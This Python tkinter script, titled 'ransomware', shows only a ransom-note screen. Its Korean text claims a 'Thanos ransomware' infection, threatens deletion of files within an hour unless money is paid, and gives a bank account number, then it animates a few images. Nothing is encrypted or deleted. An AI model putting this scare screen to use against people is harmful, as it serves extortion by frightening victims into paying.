import tkinter
import time
from logging import root

window=tkinter.Tk()
window.title("ransomware")
window.geometry("700x600+300+300")
window.resizable(False, False)
window.configure(background="black")

label1=tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.",fg="red",bg="black", font='Helvetica 14 bold')
label1.pack()
label2=tkinter.Label(window, text="1시간 안에 돈을 보내주지 않으면 파일이 삭제된다.", fg="red",bg="black", font='Helvetica 18 bold')
label2.pack()
label3=tkinter.Label(window, text="국민 786102-00-040854", fg="red",bg="black", font='Helvetica 18 bold')
label3.pack()

imagelist = ["1.png","2.png","3.png","8.png","9.png"]
# extract width and height info
photo = tkinter.PhotoImage(file=imagelist[0])
width = photo.width()
height = photo.height()
canvas = tkinter.Canvas(width=width, height=height)
canvas.pack()
# create a list of image objects
giflist = []
for imagefile in imagelist:
    photo = tkinter.PhotoImage(file=imagefile)
    giflist.append(photo)

for k in range(0, 1000):
    for gif in giflist:
        canvas.delete(tkinter.ALL)
        canvas.create_image(width/2.0, height/2.0, image=gif)
        canvas.update()
        time.sleep(0.5)


window.mainloop()